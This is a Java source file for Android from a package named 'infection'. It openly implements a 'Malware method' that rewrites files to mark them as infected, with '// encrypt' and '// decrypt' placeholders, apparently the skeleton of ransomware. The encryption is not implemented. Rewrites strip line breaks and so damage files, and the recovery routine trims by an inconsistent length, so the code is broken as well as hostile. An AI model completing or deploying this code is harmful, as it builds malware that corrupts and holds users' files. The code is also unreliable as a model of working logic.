package infection;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileReader;
import java.io.FileWriter;
import android.util.Log;

public class Item extends Node implements IInfected {

	public Item(File file) {
		super(file);
	}
	
	public Item(File file, boolean r) {
		super(file, r);
	}
	
	/* Standard IO method */
	@Override
	public StringBuilder readFile(File file) {
		StringBuilder map = new StringBuilder();
		try {
			FileReader fr = new FileReader(file.getAbsolutePath());
			BufferedReader br = new BufferedReader(fr);
			String tmp = new String();
			while ((tmp = br.readLine()) != null)
				map.append(tmp);
			br.close();
		} catch (Exception e) {
			e.printStackTrace();
		}
		return map;
	}

	@Override
	public void writeFile(File file, StringBuilder map) {
		try {
			FileWriter fw = new FileWriter(file.getAbsolutePath());
			BufferedWriter bw = new BufferedWriter(fw);
			bw.write(map.toString());
			bw.flush();
			bw.close();
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	/**/

	/* Malware method */
	@Override
	public void infected(File file) {
		StringBuilder map = new StringBuilder();
		map = readFile(file);
		if (isInfected(map))
			return;
		
		// encrypt
		map = markMagicNumber(map);
		writeFile(file, map);
		Log.w("Malware", "File infected : " + file.getAbsolutePath());
	}
	
	@Override
	public void recovered(File file) {
		StringBuilder map = new StringBuilder();
		map = readFile(file);
		if (!isInfected(map))
			return;
		
		map = freeMagicNumber(map);
		// decrypt
		writeFile(file, map);
		Log.w("Malware", "File recovered : " + file.getAbsolutePath());
	}
		
	@Override
	public StringBuilder markMagicNumber(StringBuilder map) {
		map.reverse();
		map.append(magicNumber);
		map.reverse();
		return map;
	}
	
	public StringBuilder freeMagicNumber(StringBuilder map) {
		map.reverse();
		map.setLength(map.length() - key.length());
		map.reverse();
		return map;
	}
	
	@Override
	public boolean isInfected(StringBuilder map) {
		// don't forget to reverse the magic number
		return (map.charAt(magicPosition) == magicNumber[1] && map
				.charAt(magicPosition + 1) == magicNumber[0]);
	}

	/**/
}
